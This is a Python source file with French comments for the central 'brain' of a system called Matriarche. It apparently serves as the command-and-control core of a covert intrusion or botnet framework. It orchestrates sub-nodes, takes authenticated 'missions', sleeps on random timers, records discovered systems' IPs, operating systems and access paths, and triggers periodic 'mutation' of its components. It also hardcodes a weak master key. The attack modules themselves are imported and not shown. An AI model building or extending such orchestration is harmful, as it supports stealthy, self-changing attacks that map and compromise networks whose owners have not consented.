"""Cerveau central de la Matriarche - Orchestration globale"""
import asyncio
import time
import json
from typing import Dict, List, Optional, Any
from pathlib import Path
import sys

# Ajout du chemin parent pour imports
sys.path.insert(0, str(Path(__file__).parent.parent.parent))

from matriarche.core.timer import MatriarchTimer
from matriarche.core.delegator import MissionDelegator
from matriarche.core.collector import IntelligenceCollector
from matriarche.core.mutator import MutationOrchestrator
from utils.crypto_utils import CryptoManager
from utils.storage_utils import DistributedStorage, KnowledgeGraph


class MatriarchBrain:
    """Cerveau central orchestrant toutes les opérations"""
    
    def __init__(self, config: Dict):
        self.config = config
        self.node_id = config.get('node_id', 'matriarche_001')
        self.state = 'dormant'  # dormant, awake, deep_sleep
        
        # Composants core
        self.timer = MatriarchTimer(
            min_sleep=config.get('min_sleep', 600),
            max_sleep=config.get('max_sleep', 21600)
        )
        
        self.crypto = CryptoManager()
        self.crypto.generate_keypair()
        
        # Stockage distribué
        storage_path = config.get('storage_path', '/tmp/matriarche_storage')
        self.storage = DistributedStorage(
            storage_path,
            replication_factor=config.get('replication_factor', 5)
        )
        
        # Graphe de connaissances
        self.knowledge = KnowledgeGraph(
            config.get('knowledge_path', '/tmp/matriarche_knowledge')
        )
        
        # Orchestration
        self.delegator = MissionDelegator(self)
        self.collector = IntelligenceCollector(self)
        self.mutator = MutationOrchestrator(self)
        
        # État interne
        self.sub_matriarches = []
        self.active_missions = []
        self.wake_count = 0
        self.running = False
        
    async def start(self):
        """Démarre le cycle de vie de la Matriarche"""
        self.running = True
        print(f"[{self.node_id}] Matriarche starting...")
        
        # Chargement de l'état sauvegardé
        self._load_state()
        
        # Boucle principale
        while self.running:
            try:
                if self.timer.should_wake():
                    await self._wake_cycle()
                
                # Vérification périodique (toutes les 30 secondes)
                await asyncio.sleep(30)
                
            except Exception as e:
                print(f"[{self.node_id}] Error in main loop: {e}")
                await asyncio.sleep(60)
    
    async def _wake_cycle(self):
        """Cycle de réveil de la Matriarche"""
        print(f"[{self.node_id}] Waking up... (wake #{self.wake_count})")
        self.state = 'awake'
        self.wake_count += 1
        
        try:
            # Phase 1: Collecte des informations
            print(f"[{self.node_id}] Collecting intelligence...")
            intel = await self.collector.collect_from_sub_matriarches()
            
            # Phase 2: Analyse et planification
            print(f"[{self.node_id}] Analyzing collected data...")
            self._analyze_intelligence(intel)
            
            # Phase 3: Orchestration des mutations
            if self.wake_count % 3 == 0:  # Tous les 3 réveils
                print(f"[{self.node_id}] Orchestrating mutations...")
                await self.mutator.orchestrate_evolution(intel)
            
            # Phase 4: Nouvelle délégation si missions en attente
            if self.delegator.has_pending_missions():
                print(f"[{self.node_id}] Delegating new missions...")
                await self.delegator.delegate_pending_missions()
            
            # Phase 5: Sauvegarde de l'état
            self._save_state()
            
        except Exception as e:
            print(f"[{self.node_id}] Error during wake cycle: {e}")
        
        finally:
            # Retour en dormance
            self.state = 'dormant'
            print(f"[{self.node_id}] Going back to sleep...")
    
    def receive_mission(self, mission: Dict):
        """Reçoit une mission du détenteur"""
        print(f"[{self.node_id}] Received new mission: {mission.get('objective', 'unknown')}")
        
        # Vérification authentification
        if not self._verify_mission_auth(mission):
            print(f"[{self.node_id}] Mission rejected: invalid authentication")
            return False
        
        # Ajout à la queue
        self.delegator.add_mission(mission)
        
        # Réveil forcé pour traitement urgent si priorité haute
        if mission.get('priority') == 'high':
            self.timer.force_wake()
        
        return True
    
    def _verify_mission_auth(self, mission: Dict) -> bool:
        """Vérifie l'authentification de la mission"""
        # Vérification du token
        provided_token = mission.get('auth_token', '')
        expected_hash = self.crypto.generate_hash(
            self.config.get('master_key', 'warrior').encode()
        )
        
        token_hash = self.crypto.generate_hash(provided_token.encode())
        
        return token_hash == expected_hash
    
    def _analyze_intelligence(self, intel: List[Dict]):
        """Analyse les informations collectées"""
        for report in intel:
            # Mise à jour du graphe de connaissances
            if 'discovered_systems' in report:
                for system in report['discovered_systems']:
                    self.knowledge.add_node(
                        system['id'],
                        {
                            'type': 'system',
                            'ip': system.get('ip'),
                            'os': system.get('os'),
                            'discovered_at': time.time()
                        }
                    )
            
            # Mise à jour des chemins découverts
            if 'paths' in report:
                for path in report['paths']:
                    self.knowledge.add_edge(
                        path['from'],
                        path['to'],
                        path.get('method', 'unknown')
                    )
    
    def register_sub_matriarche(self, sub_id: str, public_key: bytes):
        """Enregistre une Sous-Matriarche"""
        self.sub_matriarches.append({
            'id': sub_id,
            'public_key': public_key,
            'registered_at': time.time(),
            'last_seen': time.time()
        })
        print(f"[{self.node_id}] Registered sub-matriarche: {sub_id}")
    
    def _save_state(self):
        """Sauvegarde l'état de la Matriarche"""
        state = {
            'node_id': self.node_id,
            'wake_count': self.wake_count,
            'sub_matriarches': self.sub_matriarches,
            'active_missions': self.active_missions,
            'timestamp': time.time()
        }
        
        state_json = json.dumps(state).encode()
        self.storage.store('matriarche_state', state_json)
    
    def _load_state(self):
        """Charge l'état sauvegardé"""
        try:
            state_data = self.storage.retrieve('matriarche_state')
            if state_data:
                state = json.loads(state_data.decode())
                self.wake_count = state.get('wake_count', 0)
                self.sub_matriarches = state.get('sub_matriarches', [])
                self.active_missions = state.get('active_missions', [])
                print(f"[{self.node_id}] Loaded previous state (wake count: {self.wake_count})")
        except Exception as e:
            print(f"[{self.node_id}] Could not load state: {e}")
    
    async def shutdown(self):
        """Arrêt propre de la Matriarche"""
        print(f"[{self.node_id}] Shutting down...")
        self.running = False
        self._save_state()
    
    def get_status(self) -> Dict:
        """Retourne le statut actuel"""
        return {
            'node_id': self.node_id,
            'state': self.state,
            'wake_count': self.wake_count,
            'sub_matriarches_count': len(self.sub_matriarches),
            'active_missions': len(self.active_missions),
            'timer_status': self.timer.get_sleep_status(),
            'storage_stats': self.storage.get_storage_stats()
        }


async def main():
    """Point d'entrée principal"""
    config = {
        'node_id': 'matriarche_001',
        'min_sleep': 600,
        'max_sleep': 3600,
        'storage_path': '/tmp/matriarche_storage',
        'knowledge_path': '/tmp/matriarche_knowledge',
        'replication_factor': 5,
        'master_key': 'warrior'
    }
    
    brain = MatriarchBrain(config)
    
    try:
        await brain.start()
    except KeyboardInterrupt:
        await brain.shutdown()


if __name__ == '__main__':
    asyncio.run(main())
